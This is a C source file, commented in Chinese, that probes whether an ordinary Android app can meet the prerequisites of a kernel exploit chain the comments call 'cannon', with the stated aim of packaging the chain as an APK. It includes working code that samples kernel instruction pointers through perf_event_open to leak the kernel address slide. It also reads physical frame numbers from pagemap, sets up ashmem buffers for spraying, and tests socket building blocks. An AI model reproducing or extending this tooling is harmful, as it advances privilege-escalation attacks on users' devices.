/* m0a_probe.c — 42 号票里程碑 0a:App 域(untrusted_app)能力探针
 * 在普通 App 上下文(无 shell 域、SELinux 约束下)逐项验证 cannon 链的
 * 用户态前置依赖。只读/自含,不碰内核状态,可在任意 boot 上安全运行。
 *
 * 判读:全 PASS ⇒ t37_dryrun3 的用户态面在 App 域可跑 ⇒ APK 化无障碍。
 * 在 permissive boot 上跑时,另查 dmesg avc(permissive=1 行=enforcing 下会被拦)。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>
#include <dirent.h>

static int fails = 0;
#define CHECK(cond, name, ...) do { \
	if (cond) { printf("  [PASS] %s\n", name); } \
	else { printf("  [FAIL] %s: %s (errno=%d %s)\n", name, #__VA_ARGS__, \
	       errno, strerror(errno)); fails++; } \
} while (0)

/* ---------- 1. perf_event_open 内核 IP 采样(slide 泄漏前置) ---------- */
#define REGS_MASK  0x1FFFFFFFFULL
#define RING_PAGES 256   /* m0a 缩小版(探针用 1024) */

static void test_perf(void)
{
	struct perf_event_attr a;
	int fd;
	uint8_t *ring;
	size_t len = (RING_PAGES + 1) * 4096;
	uint64_t head, tail, kcount = 0, ucount = 0, minip = ~0ULL, maxip = 0;
	uint64_t off;

	printf("[1] perf_event_open kernel-IP sampling\n");
	memset(&a, 0, sizeof(a));
	a.size = sizeof(a);
	a.type = PERF_TYPE_HARDWARE;
	a.config = PERF_COUNT_HW_CPU_CYCLES;
	a.sample_period = 4096;
	a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID |
			PERF_SAMPLE_TIME | PERF_SAMPLE_PERIOD |
			PERF_SAMPLE_REGS_INTR;
	a.sample_regs_intr = REGS_MASK;
	a.exclude_user = 1;
	a.disabled = 1;
	fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
	CHECK(fd >= 0, "perf_event_open(HW cycles, exclude_user)");
	if (fd < 0)
		return;
	ring = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	CHECK(ring != MAP_FAILED, "perf ring mmap");
	if (ring == MAP_FAILED) { close(fd); return; }

	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	/* 打 syscall 让内核 IP 进采样 */
	for (int i = 0; i < 2000000; i++)
		(void)getpid();
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	/* 解析 ring(meta 页 + 数据区,只数 PERF_RECORD_SAMPLE 的 IP) */
	{
		struct perf_event_mmap_page *mp = (void *)ring;
		uint8_t *data = ring + 4096;
		uint64_t dsz = RING_PAGES * 4096ULL;

		__sync_synchronize();
		head = mp->data_head;
		__sync_synchronize();
		tail = mp->data_tail;
		if (head > dsz) head = dsz;         /* 只读一圈 */
		off = tail;
		while (off < head) {
			struct perf_event_header *h = (void *)(data + (off % dsz) /* 近似,假设不卷绕 */);
			if (off + sizeof(*h) > head) break;
			if (h->type == PERF_RECORD_SAMPLE && h->size >= 16) {
				uint64_t ip;
				memcpy(&ip, (uint8_t *)h + 8, 8);
				if (ip >> 48) {   /* 内核侧高地址 */
					kcount++;
					if (ip < minip) minip = ip;
					if (ip > maxip) maxip = ip;
				} else ucount++;
			}
			if (h->size < 8) break;
			off += h->size;
		}
		mp->data_tail = head;
		__sync_synchronize();
	}
	printf("  samples: kernel=%" PRIu64 " user=%" PRIu64 " kernel-IP range [0x%" PRIx64 ", 0x%" PRIx64 "]\n",
	       kcount, ucount, kcount ? minip : 0, kcount ? maxip : 0);
	CHECK(kcount >= 100, "kernel-IP sample count >=100 (slide leak feasible)");
	munmap(ring, len);
	close(fd);
}

/* ---------- 2. pagemap PFN 读取(physrw 校准前置) ---------- */
static void test_pagemap(void)
{
	int mfd, pmfd;
	void *pg;
	uint64_t entry = 0, pfn;
	uint64_t va;
	off_t off;

	printf("[2] /proc/self/pagemap PFN read\n");
	mfd = syscall(SYS_memfd_create, "m0a", 0);
	CHECK(mfd >= 0, "memfd_create");
	if (mfd < 0) return;
	if (ftruncate(mfd, 4096) != 0) { close(mfd); CHECK(0, "ftruncate"); return; }
	pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
	CHECK(pg != MAP_FAILED, "memfd mmap");
	if (pg == MAP_FAILED) { close(mfd); return; }
	memset(pg, 0x41, 4096);
	CHECK(mlock(pg, 4096) == 0, "mlock");

	pmfd = open("/proc/self/pagemap", O_RDONLY);
	CHECK(pmfd >= 0, "open pagemap");
	if (pmfd >= 0) {
		va = (uint64_t)(uintptr_t)pg;
		off = (va / 4096) * 8;
		if (pread(pmfd, &entry, 8, off) == 8) {
			pfn = entry & ((1ULL << 55) - 1);
			printf("  pagemap entry=0x%" PRIx64 " present=%d pfn=0x%" PRIx64 "\n",
			       entry, !!(entry & (1ULL << 63)), pfn);
			CHECK((entry & (1ULL << 63)) != 0, "page present bit");
			CHECK(pfn != 0, "PFN nonzero (unprivileged read works)");
		} else {
			CHECK(0, "pread pagemap");
		}
		close(pmfd);
	}
	munlock(pg, 4096);
	munmap(pg, 4096);
	close(mfd);
}

/* ---------- 3. /dev/ashmem 打开+SET_SIZE+mmap(blob 通路/植物前置) ---------- */
#define ASHMEM_SET_SIZE _IOW(0x77, 1, size_t)
static void test_ashmem(void)
{
	int fd = -1;
	const char *used = "/dev/ashmem";

	printf("[3] ashmem open+SET_SIZE+mmap\n");
	fd = open("/dev/ashmem", O_RDWR);
	if (fd < 0) {
		/* 别名节点(shell 域要绕;App 域未必) */
		DIR *d = opendir("/dev");
		struct dirent *e;
		printf("  primary open failed errno=%d(%s), scanning aliases\n",
		       errno, strerror(errno));
		if (d) {
			while ((e = readdir(d))) {
				if (strncmp(e->d_name, "ashmem", 6) == 0 &&
				    strlen(e->d_name) > 6) {
					char p[296];
					struct stat st;
					snprintf(p, sizeof(p), "/dev/%s", e->d_name);
					fd = open(p, O_RDWR);
					if (fd >= 0 && fstat(fd, &st) == 0 &&
					    major(st.st_rdev) == 10 &&
					    minor(st.st_rdev) == 104) {
						used = p;
						break;
					}
					if (fd >= 0) { close(fd); fd = -1; }
				}
			}
			closedir(d);
		}
	}
	CHECK(fd >= 0, "open ashmem node");
	if (fd < 0) return;
	printf("  using node %s\n", used);
	CHECK(ioctl(fd, ASHMEM_SET_SIZE, (size_t)0x100000) == 0, "ASHMEM_SET_SIZE");
	void *m = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	CHECK(m != MAP_FAILED, "ashmem mmap");
	if (m != MAP_FAILED) {
		memset(m, 0x5a, 4096);
		CHECK(((volatile char *)m)[0] == 0x5a, "ashmem rw verify");
		munmap(m, 0x100000);
	}
	close(fd);
}

/* ---------- 4. AF_UNIX DGRAM 阻塞载体(链基础件) ---------- */
static void test_unix_dgram(void)
{
	int sv[2] = {-1, -1};
	char buf[64];
	struct timeval tv = {0, 100000};

	printf("[4] AF_UNIX DGRAM socketpair + sendmsg\n");
	CHECK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) == 0, "socketpair");
	if (sv[0] < 0) return;
	memset(buf, 0x37, sizeof(buf));
	CHECK(send(sv[0], buf, 48, 0) == 48, "send 48B");
	setsockopt(sv[1], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	CHECK(recv(sv[1], buf, sizeof(buf), 0) == 48, "recv 48B");
	close(sv[0]); close(sv[1]);
}

/* ---------- 5. 上下文 ---------- */
static void show_context(void)
{
	struct utsname u;
	char ctx[128] = {0};
	int fd;
	double up = 0;
	FILE *f;

	printf("[0] context\n");
	uname(&u);
	printf("  uname: %s %s\n", u.sysname, u.release);
	printf("  uid=%d gid=%d\n", getuid(), getgid());
	fd = open("/proc/self/attr/current", O_RDONLY);
	if (fd >= 0) {
		if (read(fd, ctx, sizeof(ctx) - 1) > 0)
			printf("  selinux: %s", ctx);
		close(fd);
	}
	f = fopen("/proc/uptime", "r");
	if (f) { if (fscanf(f, "%lf", &up) != 1) up = -1; fclose(f); }
	printf("  uptime=%.0fs\n", up);
	f = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
	if (f) { int v = 99; if (fscanf(f, "%d", &v) != 1) v = 99; fclose(f);
		 printf("  perf_event_paranoid=%d\n", v); }
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== m0a_probe: app-domain capability check (42 ticket M0a) ===\n");
	show_context();
	test_perf();
	test_pagemap();
	test_ashmem();
	test_unix_dgram();
	printf("=== m0a_probe: %s (fails=%d) ===\n", fails ? "FAIL" : "ALL PASS", fails);
	return fails ? 1 : 0;
}
